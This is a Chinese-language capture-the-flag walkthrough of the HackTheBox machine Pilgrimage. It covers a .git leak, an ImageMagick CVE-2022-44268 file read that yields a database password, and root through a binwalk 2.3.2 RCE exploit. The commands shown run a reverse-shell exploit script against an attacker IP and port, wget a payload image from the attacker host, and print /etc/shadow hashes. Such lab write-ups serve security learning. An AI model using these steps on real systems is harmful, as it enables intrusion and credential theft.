---
title: Pilgrimage - HackTheBox
url: https://darkwing.moe/2023/06/26/Pilgrimage-HackTheBox/
source: 喵喵喵喵
date: 2023-06-27
fetch_date: 2025-10-04T11:44:18.803136
---

# Pilgrimage - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Pilgrimage - HackTheBox

# Pilgrimage - HackTheBox

##### 2023-06-26

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. .git](#git)
   1. [3.1. magick](#magick)
4. [4. ImageMagick](#ImageMagick)
   1. [4.1. db](#db)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
   1. [6.1. malwarescan.sh](#malwarescan-sh)
   2. [6.2. binwalk](#binwalk)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Pilgrimage - HackTheBox

2023-06-26

# 基本信息

* <https://app.hackthebox.com/machines/Pilgrimage>
* 10.10.11.219

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062601.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.219 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 13:22 CST Nmap scan report for 10.10.11.219 Host is up (0.098s latency). Not shown: 997 closed tcp ports (conn-refused) PORT      STATE    SERVICE   VERSION 22/tcp    open     ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA) |   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA) |_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519) 80/tcp    open     http      nginx 1.18.0 |_http-title: Did not follow redirect to http://pilgrimage.htb/ |_http-server-header: nginx/1.18.0 13783/tcp filtered netbackup Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.219 pilgrimage.htb ``` |

在线压缩图片的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062602.jpg)

自己注册登录后测试功能就是上传图片，给出压缩后的图片

# .git

很容易发现git泄漏：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062603.jpg)

dump代码分析：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` git-dumper http://pilgrimage.htb/.git git_dump ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062604.jpg)

## magick

根据代码可以知道图像处理是使用的magick，我们dump也得到有这个文件，是一个linux elf，测试运行发现是ImageMagick 7.1.0-49：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062605.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062606.jpg)

# ImageMagick

搜索可以发现相关漏洞：

* ImageMagick: The hidden vulnerability behind your online images - Metabase Q
  <https://www.metabaseq.com/imagemagick-zero-days/>
* voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read
  <https://github.com/voidz0r/CVE-2022-44268>

就是按照readme 一步步来，本地用到了identify需要装一下imagemagick：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` cargo run "/etc/passwd"  brew install imagemagick identify -verbose 649924974daec.png ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062607.jpg)

## db

根据前面代码中得到的sqlite数据库路径，读取数据库文件：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` cargo run "/var/db/pilgrimage"  identify -verbose 649928a02e497.png ``` |

结合前面passwd得到的用户名emily，分隔出密码(也可以解码后内容作为sqlite文件读取)：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` emily abigchonkyboi123 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062608.jpg)

# user flag

得到的账号密码登录，得到user flag:

(目录下那些binwalk是别人放的)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062609.jpg)

# 提权信息

运行pspy,发现root定时运行malwarescan.sh：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062610.jpg)

## malwarescan.sh

查看代码，发现是对shrunk目录下的文件运行binwalk后进行检测，满足条件就删除：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062611.jpg)

## binwalk

binwalk 2.3.2版本，存在已知漏洞：

* Security Advisory: Remote Command Execution in binwalk - ONEKEY
  <https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/>
* Binwalk v2.3.2 - Remote Command Execution (RCE) - Python remote Exploit
  <https://www.exploit-db.com/exploits/51249>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062612.jpg)

# 提权 & root flag

按照exp说明一步步来：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` python3 51249.py image.png 10.10.14.11 4444  # target cd /var/www/pilgrimage.htb/shrunk/ wget http://10.10.14.11:7777/binwalk_exploit.png ``` |

触发，得到root：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062614.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023062613.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$wlP.1uHMf0rRNBijw8HHv.$LLm1qK9ISnryNLz6wa0asgaOotvT7nbGC7py0d5nYoD:19398:0:99999:7::: emily:$y$j9T$ktYE1a41rPMM9Qc8UOjaz0$kQrcvH7mLwn/xsppIViwVr01zcx8jFQWK4pl7lQicq0:19412:0:99999:7::: ``` |

# 参考资料

* arthaud/git-dumper: A tool to dump a git repository from a website
  <https://github.com/arthaud/git-dumper>
* ImageMagick: The hidden vulnerability behind your online images - Metabase Q
  <https://www.metabaseq.com/imagemagick-zero-days/>
* voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read
  <https://github.com/voidz0r/CVE-2022-44268>
* Security Advisory: Remote Command Execution in binwalk - ONEKEY
  <https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/>
* Binwalk v2.3.2 - Remote Command Execution (RCE) - Python remote Exploit
  <https://www.exploit-db.com/exploits/51249>

> Last updated: 2023-11-27 09:50:59
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Intentions - HackTheBox](/2023/07/03/Intentions-HackTheBox/)

[Next

#### Sandworm - HackTheBox](/2023/06/19/Sandworm-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)